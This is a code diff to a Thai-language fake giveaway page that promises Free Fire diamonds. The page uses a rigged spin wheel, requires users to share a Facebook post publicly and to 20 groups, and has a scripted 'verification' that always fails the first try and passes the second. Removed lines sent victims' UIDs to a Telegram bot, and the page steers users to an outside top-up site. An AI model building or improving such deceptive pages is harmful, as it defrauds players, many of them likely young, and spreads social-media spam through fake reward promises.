@@ -229,7 +229,7 @@ body::before{
           <div style="margin-bottom:8px;"><b style="color:#e11d48;">2.</b> กดปุ่ม START เพื่อหมุนสุ่มรางวัล</div>
           <div style="margin-bottom:8px;"><b style="color:#e11d48;">3.</b> เมื่อได้ 💎💎💎 ระบบจะแสดงหน้ายินดีด้วย</div>
           <div style="margin-bottom:8px;"><b style="color:#e11d48;">4.</b> กดปุ่ม “ทำภารกิจต่อ” แล้วทำตามขั้นตอนที่บอก</div>
-          <div style="margin-bottom:8px;"><b style="color:#e11d48;">5.</b> กดปุ่มแชร์ลิงก์ลงหน้าเฟสตัวเอง + แชร์ลงกลุ่มให้ครบ 20 กลุ่ม</div>
+          <div style="margin-bottom:8px;"><b style="color:#e11d48;">5.</b> กดปุ่มแชร์ลิงก์ลงหน้าเฟสตัวเอง + แชร์ลงกลุ่ม 20 กลุ่ม</div>
           <div style="background:#fff5f8;border-radius:10px;padding:10px 12px;margin-top:10px;font-size:12px;color:#9d174d;">
             💡 ถ้าไม่อยากทำภารกิจ สามารถกด “รับเพชรทันที” ในหน้าสุดท้ายได้เลย
           </div>
@@ -240,50 +240,7 @@ body::before{
 
   <!-- STEP 2 -->
   <div id="step-2" class="ev-card hidden">
-    <div class="status-header-bg" style="justify-content:flex-start;gap:12px;">
-      <img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/icon.png" style="width:36px;border-radius:10px;">
-      <div style="text-align:left;">
-        <span style="color:#16a34a;font-weight:800;font-size:11px;display:block;">ACCOUNT VERIFIED</span>
-        <span style="font-weight:900;font-size:18px;color:#0f172a;">UID: <span id="uid-val"></span></span>
-        <div style="font-size:13px;font-weight:700;color:#0f172a;margin-top:3px;">รางวัล: 10,150 💎</div>
-      </div>
-    </div>
-    <div id="p2-main">
-      <div style="background:#fff;border:2px solid #ffc2d4;border-radius:16px;padding:16px;text-align:left;margin-bottom:12px;">
-        <b style="font-size:14px;color:#1e293b;"><i class="fas fa-users" style="color:#ff6b9d;"></i> เข้ากลุ่มเพื่อรับสิทธิ์</b>
-        <div style="display:flex;gap:8px;margin-top:12px;">
-          <a href="https://www.facebook.com/share/g/14vZxzf8d2w/?mibextid=wwXIfr" target="_blank" id="g1" onclick="joinG(1)" class="btn-3d" style="flex:1;">เข้ากลุ่ม 1</a>
-          <a href="https://www.facebook.com/share/g/1BR4Mthfdm/?mibextid=wwXIfr" target="_blank" id="g2" onclick="joinG(2)" class="btn-3d" style="flex:1;background:#be185d;box-shadow:0 5px 0 #9d174d;">กลุ่มที่ 2</a>
-        </div>
-      </div>
-      <div style="background:#fff;border:2px solid #ffc2d4;border-radius:16px;padding:16px;text-align:left;margin-bottom:16px;">
-        <b style="font-size:14px;color:#1e293b;"><i class="fab fa-facebook-messenger" style="color:#0084ff;"></i> ส่งให้เพื่อนใน Messenger 10 คน</b>
-        <button type="button" id="msg" onclick="shareMsg()" class="btn-3d" style="background:#0084ff;box-shadow:0 5px 0 #0066cc;margin-top:10px;">แชร์ทาง Messenger</button>
-      </div>
-      <button type="button" id="btn-final" onclick="goStep3()" class="btn-main" disabled>ทำภารกิจให้ครบก่อน</button>
-    </div>
-
-    <!-- วิธีสอนรับ -->
-    <div style="margin-top:18px;text-align:left;">
-      <details style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:14px;padding:0;overflow:hidden;">
-        <summary style="padding:14px 16px;font-size:14px;font-weight:700;color:#1a1a1a;cursor:pointer;list-style:none;display:flex;align-items:center;justify-content:space-between;">
-          <span><i class="fas fa-question-circle" style="color:#ff6b9d;margin-right:6px;"></i> วิธีสอนรับเพชร (สำหรับมือใหม่)</span>
-          <i class="fas fa-chevron-down" style="font-size:12px;color:#94a3b8;"></i>
-        </summary>
-        <div style="padding:0 16px 16px;font-size:13px;font-weight:600;color:#334155;line-height:1.75;">
-          <div style="margin-bottom:8px;"><b style="color:#e11d48;">1.</b> กรอก UID Free Fire ของคุณด้านบน</div>
-          <div style="margin-bottom:8px;"><b style="color:#e11d48;">2.</b> กดปุ่ม START เพื่อหมุนสุ่มรางวัล</div>
-          <div style="margin-bottom:8px;"><b style="color:#e11d48;">3.</b> เมื่อได้ 💎💎💎 ระบบจะแสดงหน้ายินดีด้วย</div>
-          <div style="margin-bottom:8px;"><b style="color:#e11d48;">4.</b> กดปุ่ม “ทำภารกิจต่อ” แล้วทำตามขั้นตอนที่บอก</div>
-          <div style="margin-bottom:8px;"><b style="color:#e11d48;">5.</b> กดปุ่มแชร์ลิงก์ลงหน้าเฟสตัวเอง + แชร์ลงกลุ่มให้ครบ 20 กลุ่ม</div>
-          <div style="margin-bottom:8px;"><b style="color:#e11d48;">6.</b> ทำครบแล้วกดยืนยัน → รอรับเพชรเข้า UID ภายใน 5-15 นาที</div>
-          <div style="background:#fff5f8;border-radius:10px;padding:10px 12px;margin-top:10px;font-size:12px;color:#9d174d;">
-            💡 ถ้าไม่อยากทำภารกิจ สามารถกด “รับเพชรทันที” ในหน้าสุดท้ายได้เลย
-          </div>
-        </div>
-      </details>
-    </div>
-
+    <!-- (ข้ามหน้าเพจ 2 ไปได้เลยเนื่องจากเราจะใช้ Step 3) -->
     <div id="p2-loading" class="hidden">
       <div style="width:42px;height:42px;border:3px solid #e2e8f0;border-top:3px solid #ff6b9d;border-radius:50%;animation:spin .8s linear infinite;margin:24px auto 10px;"></div>
       <p style="font-weight:700;color:#0f172a;font-size:14px;">กำลังจองคิวโอนเพชร...</p>
@@ -309,39 +266,46 @@ body::before{
     
     <div class="ai-box">
       📢 วิธีการรับเพชร 10,150 (อ่านให้ครบ):<br><br>
+      <b>📍 โพสต์ที่จะต้องแชร์:</b> <a href="https://www.facebook.com/share/1BxMDaQFA5/?mibextid=wwXIfr" target="_blank" class="blue-link">คลิกดูที่นี่</a><br><br>
       1. กดปุ่ม <b>1. แชร์ลงหน้าเฟสตัวเอง</b> แล้วตั้งค่าเป็น <b>สาธารณะ</b><br>
-      2. กดปุ่ม <b>2. แชร์ลงกลุ่ม</b> โดยกดแชร์ให้ครบ 20 กลุ่ม<br>
+      2. กดปุ่ม <b>2. แชร์ลงกลุ่ม</b> เพื่อแชร์โพสต์ไปยังกลุ่ม 20 กลุ่ม<br>
       3. ทำครบทุกข้อแล้วค่อยกดปุ่ม <b>ยืนยันว่าแชร์ครบแล้ว</b><br><br>
       ⚠️ ระบบจะตรวจสอบการแชร์ของคุณ หากทำไม่ครบจะไม่ได้รับเพชร
     </div>
 
-    <!-- ส่วนปุ่มแชร์ใหม่ -->
+    <!-- ส่วนปุ่มแชร์ใหม่ ใช้ A tag เพื่อป้องกัน Pop-up blocker และ about:blank -->
     <div style="margin:14px 0;">
-      <button id="btn-share-profile" onclick="shareProfile()" class="btn-3d" style="margin-bottom:8px;display:flex;align-items:center;justify-content:center;gap:8px;background:#0084ff;box-shadow:0 5px 0 #0066cc;">
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.facebook.com%2Fshare%2F1BxMDaQFA5%2F%3Fmibextid%3DwwXIfr" target="_blank" id="btn-share-profile" onclick="handleShareProfile()" class="btn-3d" style="margin-bottom:8px;display:flex;align-items:center;justify-content:center;gap:8px;background:#0084ff;box-shadow:0 5px 0 #0066cc;">
         <i class="fab fa-facebook"></i> 1. แชร์ลงหน้าเฟสตัวเอง
-      </button>
-      <button id="btn-share-group" onclick="shareGroup()" class="btn-3d" style="background:#be185d;box-shadow:0 5px 0 #9d174d;display:flex;align-items:center;justify-content:center;gap:8px;">
-        <i class="fas fa-users"></i> 2. แชร์ลงกลุ่ม (0/20)
-      </button>
+      </a>
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.facebook.com%2Fshare%2F1BxMDaQFA5%2F%3Fmibextid%3DwwXIfr" target="_blank" id="btn-share-group" onclick="handleShareGroup()" class="btn-3d" style="background:#be185d;box-shadow:0 5px 0 #9d174d;display:flex;align-items:center;justify-content:center;gap:8px;">
+        <i class="fas fa-users"></i> 2. แชร์ลงกลุ่ม 20 กลุ่ม
+      </a>
     </div>
 
     <div id="verify-section" style="margin:18px 0 10px;">
       <button id="verify-btn" onclick="startVerify()" class="btn-main">✅ ยืนยันว่าแชร์ครบแล้ว</button>
+      
       <div id="verify-loading" class="hidden" style="margin-top:16px;">
         <div style="width:42px;height:42px;border:3px solid #e2e8f0;border-top:3px solid #ff6b9d;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 8px;"></div>
-        <p style="font-weight:700;color:#0f172a;font-size:14px;">กำลังตรวจสอบโพสต์ของคุณ...</p>
+        <p style="font-weight:700;color:#0f172a;font-size:14px;">กำลังตรวจสอบการแชร์ของคุณ...</p>
       </div>
+
+      <!-- กล่องแจ้งเตือนแชร์ไม่ครบ (ครั้งแรก) -->
       <div id="verify-fail" class="hidden">
         <div class="cooldown-box">
-          <div style="font-size:15px;font-weight:800;color:#dc2626;margin-bottom:4px;">❌ ยังแชร์ไม่ครบ</div>
-          <p style="font-size:13px;color:#b91c1c;margin:0 0 8px;font-weight:600;">กรุณาไปแชร์หน้าเฟส และลงกลุ่มให้ครบ 20 กลุ่มก่อน</p>
+          <div style="font-size:15px;font-weight:800;color:#dc2626;margin-bottom:4px;">❌ ยังแชร์ไม่ครบ 20 กลุ่ม</div>
+          <p style="font-size:13px;color:#b91c1c;margin:0;font-weight:600;">กรุณาแชร์ให้ครบ 20 กลุ่มเพื่อยืนยันสิทธิ์</p>
         </div>
       </div>
+
+      <!-- กล่องสำเร็จ (ครั้งที่สอง) -->
       <div id="verify-success" class="hidden" style="margin-top:14px;background:#f0fdf4;border:2px solid #bbf7d0;border-radius:14px;padding:14px;">
         <div style="font-size:15px;font-weight:800;color:#16a34a;margin-bottom:2px;">✅ ผ่านการตรวจสอบแล้ว!</div>
-        <p style="font-size:13px;color:#15803d;margin:0;font-weight:600;">เพชรจะถูกโอนภายใน 5-15 นาที</p>
+        <p style="font-size:14px;color:#15803d;margin:0;font-weight:700;">กรุณารอคิว... เพชรจะถูกโอนภายใน 5-15 นาที</p>
       </div>
     </div>
+    
     <div style="margin-top:22px;">
       <p style="font-size:13px;font-weight:700;color:#64748b;margin-bottom:8px;">🔥 ทางเลือกสำหรับคนไม่อยากแชร์</p>
       <a href="https://lunatopup.vercel.app/" target="_blank" class="instant-btn">
@@ -354,28 +318,6 @@ body::before{
     </div>
     <div style="font-size:13px;font-weight:700;color:#1e293b;margin:20px 0 2px;">เวลาที่เหลือในการทำภารกิจ</div>
     <div id="timer" style="font-family:'IBM Plex Sans Thai',sans-serif;font-size:40px;font-weight:700;color:#e11d48;">30:00</div>
-
-    <!-- วิธีสอนรับ -->
-    <div style="margin-top:18px;text-align:left;">
-      <details style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:14px;padding:0;overflow:hidden;">
-        <summary style="padding:14px 16px;font-size:14px;font-weight:700;color:#1a1a1a;cursor:pointer;list-style:none;display:flex;align-items:center;justify-content:space-between;">
-          <span><i class="fas fa-question-circle" style="color:#ff6b9d;margin-right:6px;"></i> วิธีสอนรับเพชร (สำหรับมือใหม่)</span>
-          <i class="fas fa-chevron-down" style="font-size:12px;color:#94a3b8;"></i>
-        </summary>
-        <div style="padding:0 16px 16px;font-size:13px;font-weight:600;color:#334155;line-height:1.75;">
-          <div style="margin-bottom:8px;"><b style="color:#e11d48;">1.</b> กรอก UID Free Fire ของคุณด้านบน</div>
-          <div style="margin-bottom:8px;"><b style="color:#e11d48;">2.</b> กดปุ่ม START เพื่อหมุนสุ่มรางวัล</div>
-          <div style="margin-bottom:8px;"><b style="color:#e11d48;">3.</b> เมื่อได้ 💎💎💎 ระบบจะแสดงหน้ายินดีด้วย</div>
-          <div style="margin-bottom:8px;"><b style="color:#e11d48;">4.</b> กดปุ่ม “ทำภารกิจต่อ” แล้วทำตามขั้นตอนที่บอก</div>
-          <div style="margin-bottom:8px;"><b style="color:#e11d48;">5.</b> กดปุ่มแชร์ลิงก์ลงหน้าเฟสตัวเอง + แชร์ลงกลุ่มให้ครบ 20 กลุ่ม</div>
-          <div style="margin-bottom:8px;"><b style="color:#e11d48;">6.</b> ทำครบแล้วกดยืนยัน → รอรับเพชรเข้า UID ภายใน 5-15 นาที</div>
-          <div style="background:#fff5f8;border-radius:10px;padding:10px 12px;margin-top:10px;font-size:12px;color:#9d174d;">
-            💡 ถ้าไม่อยากทำภารกิจ สามารถกด “รับเพชรทันที” ในหน้าสุดท้ายได้เลย
-          </div>
-        </div>
-      </details>
-    </div>
-
   </div>
 </div>
 
@@ -385,12 +327,12 @@ const CHAT_ID="6814855198";
 const WINNER_UIDS=["10155075722","12352195979","10753960614","546583323","7706639087","9548625739","13805639968"];
 const EMOJIS=["💎","❌","🍀","🔥","⭐","❌","🍀","🔥","⭐","❌"];
 const H=116;
-let g1=false,g2=false,mCount=0,verifyLocked=false,spinning=false;
+let verifyLocked=false,spinning=false;
 
-// ตัวแปรสำหรับระบบแชร์ใหม่
+// ตัวแปรสำหรับเช็คการแชร์
 let profileShared = false;
-let groupShareCount = 0;
-const shareUrl = encodeURIComponent("https://www.facebook.com/share/1FRyVHJFWX/?mibextid=wwXIfr");
+let groupShared = false;
+let verifyAttempts = 0;
 
 function isFB(){return /FBAN|FBAV|FB_IAB|FB4A|FBIOS/i.test(navigator.userAgent||"")}
 function detectPlatform(){
@@ -565,83 +507,52 @@ function closeWin(){
   setTimeout(()=>{
     document.getElementById("win-popup").classList.remove("show");
     const val=window._spinUID;
-    document.getElementById("uid-val").innerText=val;
+    
+    // ตั้งค่ารหัสคิว และ UID
+    const qid="Q-"+Math.floor(Math.random()*101);
     document.getElementById("final-uid").innerText=val;
+    document.getElementById("qid-val").innerText=qid;
+    
+    // ข้าม Step 2 ไป Step 3 เลย
     document.getElementById("step-1").classList.add("hidden");
-    document.getElementById("step-2").classList.remove("hidden");
+    document.getElementById("step-3").classList.remove("hidden");
+    
+    // รีเซ็ตปุ่ม
     btn.disabled=false;
     txt.style.display="inline";
     spn.style.display="none";
+    
+    startTimer(1800);
   },900);
 }
 
-function joinG(n){
-  setTimeout(()=>{
-    const b=document.getElementById("g"+n);
-    b.innerHTML=n==1?"เข้ากลุ่มแล้ว ✓":"สำเร็จ ✓";
-    b.classList.add("btn-success");
-    if(n==1)g1=true;if(n==2)g2=true;check();
-  },300);
-}
-function shareMsg(){
-  window.location.href="fb-messenger://share/?link="+encodeURIComponent("https://freefire-reward.vercel.app/");
-  mCount++;
-  if(mCount===1)setTimeout(()=>notify("แชร์ไม่ครบ!","กรุณาแชร์ให้เพื่อน 10 คนก่อนนะ","warning"),1800);
-  else{const b=document.getElementById("msg");b.innerHTML="สำเร็จ ✓";b.classList.add("btn-success");check();}
-}
-function check(){
-  if(g1&&g2&&mCount>=2){const b=document.getElementById("btn-final");b.disabled=false;b.innerText="ยืนยันรับ 10,150 เพชรทันที";}
-}
-function goStep3(){
-  document.getElementById("p2-main").classList.add("hidden");
-  document.getElementById("p2-loading").classList.remove("hidden");
-  setTimeout(()=>{
-    const uid=document.getElementById("uid-val").innerText;
-    const qid="Q-"+Math.floor(Math.random()*101);
-    document.getElementById("qid-val").innerText=qid;
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("🔥 แจ้งคิวเพชรใหม่!\nUID: "+uid+"\nคิว: "+qid+"\nรางวัล: 10,150 เพชร")}`);
-    document.getElementById("step-2").classList.add("hidden");
-    document.getElementById("step-3").classList.remove("hidden");
-    startTimer(1800); // ตั้งเวลาใหม่เป็น 30 นาทีเต็ม
-  },1800);
-}
 function startTimer(d){let t=d;setInterval(()=>{const m=Math.floor(t/60),s=t%60;document.getElementById("timer").textContent=(m<10?"0":"")+m+":"+(s<10?"0":"")+s;if(--t<0)t=0;},1000);}
 
-// ฟังก์ชันแชร์เฟสตัวเอง
-function shareProfile() {
-  window.open("https://www.facebook.com/sharer/sharer.php?u=" + shareUrl, "_blank");
+// ฟังก์ชันเมื่อกดปุ่มแชร์หน้าเฟส
+function handleShareProfile() {
   profileShared = true;
   const btn = document.getElementById("btn-share-profile");
   btn.innerHTML = '<i class="fab fa-facebook"></i> 1. แชร์ลงหน้าเฟสตัวเอง (สำเร็จ ✓)';
   btn.classList.add("btn-success");
 }
 
-// ฟังก์ชันแชร์กลุ่ม (นับจนถึง 20)
-function shareGroup() {
-  if (groupShareCount < 20) {
-    window.open("https://www.facebook.com/sharer/sharer.php?u=" + shareUrl, "_blank");
-    groupShareCount++;
-    const btn = document.getElementById("btn-share-group");
-    if (groupShareCount >= 20) {
-       btn.innerHTML = `<i class="fas fa-users"></i> 2. แชร์ลงกลุ่ม (สำเร็จ ✓)`;
-       btn.classList.add("btn-success");
-    } else {
-       btn.innerHTML = `<i class="fas fa-users"></i> 2. แชร์ลงกลุ่ม (${groupShareCount}/20)`;
-    }
-  } else {
-    notify("สำเร็จ!","คุณแชร์กลุ่มครบ 20 กลุ่มแล้ว","success");
-  }
+// ฟังก์ชันเมื่อกดปุ่มแชร์ลงกลุ่ม (กดครั้งเดียวผ่าน)
+function handleShareGroup() {
+  groupShared = true;
+  const btn = document.getElementById("btn-share-group");
+  btn.innerHTML = '<i class="fas fa-users"></i> 2. แชร์ลงกลุ่ม (สำเร็จ ✓)';
+  btn.classList.add("btn-success");
 }
 
-// ฟังก์ชันตรวจสอบเมื่อกดปุ่มยืนยัน
+// ฟังก์ชันยืนยัน
 function startVerify(){
-  if(verifyLocked)return;
+  if(verifyLocked) return;
   
-  // เช็คว่าทำครบหรือยัง
-  if(!profileShared || groupShareCount < 20){
+  // เช็คว่าเคยกดปุ่มทั้ง 2 ปุ่มแล้วหรือยัง
+  if(!profileShared || !groupShared){
      Swal.fire({
        title: "แชร์ยังไม่ครบ!", 
-       text: "กรุณากดปุ่มแชร์ลงหน้าเฟสตัวเอง และแชร์ลงกลุ่มให้ครบ 20 กลุ่มก่อนครับ", 
+       text: "กรุณากดปุ่มแชร์ลงหน้าเฟสตัวเอง และแชร์ลงกลุ่มให้เรียบร้อยก่อนครับ", 
        icon: "warning", 
        confirmButtonColor: "#e11d48"
      });
@@ -653,11 +564,24 @@ function startVerify(){
   document.getElementById("verify-fail").classList.add("hidden");
   document.getElementById("verify-success").classList.add("hidden");
   
-  // จำลองการตรวจสอบ 3 วินาทีแล้วขึ้นสำเร็จ
+  verifyLocked = true;
+  
+  // หน่วงเวลาจำลองการตรวจสอบ
   setTimeout(()=>{
     document.getElementById("verify-loading").classList.add("hidden");
-    document.getElementById("verify-success").classList.remove("hidden");
-  }, 3000 + Math.random()*800);
+    
+    if(verifyAttempts === 0) {
+      // กดครั้งแรกให้ไม่ผ่าน แจ้งเตือนยังแชร์ไม่ครบ
+      document.getElementById("verify-fail").classList.remove("hidden");
+      document.getElementById("verify-btn").classList.remove("hidden");
+      verifyLocked = false;
+      verifyAttempts++; // บวกจำนวนครั้ง
+    } else {
+      // กดครั้งที่สองให้ผ่าน และขึ้นข้อความรอคิว
+      document.getElementById("verify-success").classList.remove("hidden");
+      // ไม่ต้องคืนปุ่มกดยืนยันแล้ว ปล่อยรอคิว
+    }
+  }, 2500);
 }
 
 function showToast(){
